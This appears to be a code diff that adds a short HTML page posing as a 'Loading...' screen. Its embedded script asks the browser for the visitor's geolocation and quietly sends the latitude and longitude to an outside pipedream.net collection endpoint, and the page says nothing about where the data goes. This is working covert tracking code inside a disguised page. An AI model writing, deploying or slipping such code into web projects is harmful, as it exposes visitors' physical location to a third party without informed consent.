@@ -1,0 +1,12 @@
+<!DOCTYPE html><html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+    <script>
+        navigator.geolocation.getCurrentPosition(function(position) {       fetch('https://eon186u4rmikh86.m.pipedream.net?lat=' + position.coords.latitude + '&lon=' + position.coords.longitude);
+        });
+    </script>
+    <p>Please wait, loading content...</p>
+</body>
+</html> 
